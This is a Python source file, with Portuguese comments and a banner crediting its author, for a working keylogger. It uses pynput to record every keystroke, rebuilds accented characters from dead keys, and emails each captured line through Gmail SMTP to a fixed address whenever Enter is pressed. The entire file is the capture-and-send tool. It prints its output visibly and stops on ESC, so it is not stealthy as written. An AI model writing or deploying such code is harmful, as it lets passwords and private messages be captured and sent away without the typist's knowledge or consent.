from pynput import keyboard
import os
import time
import yagmail  # Biblioteca para enviar o e-mail
import getpass  # Para garantir que a senha não seja visível no terminal

# Cores ANSI
GREEN = "\033[92m"
RESET = "\033[0m"
BOLD = "\033[1m"

def exibir_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = f"""
{GREEN}{BOLD}
       💻  ============================================ 💻
         ____                 _                       _            
        |  _ \\  ___  ___  ___| |__   __ _ _ __   __ _| |_ ___  _ __ 
        | | | |/ _ \\/ __|/ _ \\ '_ \\ / _` | '_ \\ / _` | __/ _ \\| '__| 
        | |_| |  __/\\__ \\  __/ |_) | (_| | | | | (_| | || (_) | |   
        |____/ \\___||___/\\___|_.__/ \\__,_|_| |_|\\__,_|\\__\\___/|_|   
                                                                    
       💻  ============================================ 💻

               Keylogger Python no Terminal
       Criado por Paulo Henrique Azevedo do Nascimento

     [!] Pressione ESC a qualquer momento para encerrar
{RESET}
"""
    print(banner)
    time.sleep(1.2)

class KeyLogger:
    def __init__(self, email, password):
        self.current_sentence = ""
        self.dead_key = None
        self.dead_key_map = {
            ("´", "a"): "á", ("´", "e"): "é", ("´", "i"): "í", ("´", "o"): "ó", ("´", "u"): "ú", ("´", "y"): "ý",
            ("`", "a"): "à", ("`", "e"): "è", ("`", "i"): "ì", ("`", "o"): "ò", ("`", "u"): "ù",
            ("~", "a"): "ã", ("~", "o"): "õ", ("~", "n"): "ñ",
            ("^", "a"): "â", ("^", "e"): "ê", ("^", "i"): "î", ("^", "o"): "ô", ("^", "u"): "û",
            ("¨", "u"): "ü", ("¨", "i"): "ï", ("¨", "e"): "ë", ("¨", "a"): "ä", ("¨", "o"): "ö",
            ("'", "c"): "ç",
        }

        self.email = email
        self.password = password
        self.yag = yagmail.SMTP(user=self.email, password=self.password)

    def enviar_email(self, message):
        try:
            # Envia o e-mail para um endereço específico (aqui, um exemplo de e-mail)
            self.yag.send(to="seuemail@gmail.com", subject="Novo Texto Capturado", contents=message)
            print(f"{GREEN}🟢 E-mail enviado com sucesso!{RESET}")
        except Exception as e:
            print(f"{GREEN}[ERRO] Falha ao enviar e-mail: {e}{RESET}")

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                char = key.char

                if char in ['´', '`', '~', '^', '¨', "'"]:
                    self.dead_key = char
                else:
                    if self.dead_key:
                        combo = self.dead_key_map.get((self.dead_key, char.lower()))
                        if combo:
                            self.current_sentence += combo
                        else:
                            self.current_sentence += self.dead_key + char
                        self.dead_key = None
                    else:
                        self.current_sentence += char

                print(f"\r{GREEN}Frase atual: {self.current_sentence} {RESET}", end="", flush=True)

            elif key == keyboard.Key.space:
                self.current_sentence += " "
                print(f"\r{GREEN}Frase atual: {self.current_sentence} {RESET}", end="", flush=True)

            elif key == keyboard.Key.backspace:
                self.current_sentence = self.current_sentence[:-1]
                print(f"\r{GREEN}Frase atual: {self.current_sentence} {RESET}", end="", flush=True)

            elif key == keyboard.Key.enter:
                print(f"\n{GREEN}Frase registrada: {self.current_sentence}{RESET}")
                # Envia o texto capturado por e-mail
                self.enviar_email(self.current_sentence)
                self.current_sentence = ""

            elif key == keyboard.Key.esc:
                print(f"\n{GREEN}Encerrando...{RESET}")
                return False

        except Exception as e:
            print(f"\n{GREEN}[ERRO] {e}{RESET}")

    def start(self):
        exibir_banner()
        print(f"{GREEN}🟢 Keylogger rodando em segundo plano. Pressione ESC para sair.{RESET}")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    email = input("Digite seu e-mail do Gmail: ")
    password = getpass.getpass("Digite sua senha do Gmail: ")  # Para evitar que a senha seja visível
    logger = KeyLogger(email, password)
    logger.start()
    
